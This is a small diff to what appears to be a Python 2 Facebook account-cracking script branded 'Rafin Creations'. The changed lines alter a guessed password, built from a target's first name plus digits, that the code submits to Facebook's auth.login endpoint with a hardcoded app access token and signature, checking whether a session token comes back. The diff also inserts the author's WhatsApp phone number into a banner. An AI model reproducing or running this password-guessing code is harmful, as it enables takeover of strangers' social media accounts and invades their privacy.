@@ -386,7 +386,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = b['first_name'] + '786'
+													pass6 = b['first_name'] + '11'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -436,7 +436,7 @@ def pilih_super():
 : \033[1;96m .....Rafin  Creations........... \033[1;93m :
 ♡──────────────•◈•──────────────♡.' 
                 whatsapp Num
-               +NI DENA """
+               01874169944 """
 	
 	raw_input("\n\033[1;92m[\033[1;94mBack\033[1;96m]")
 	menu()
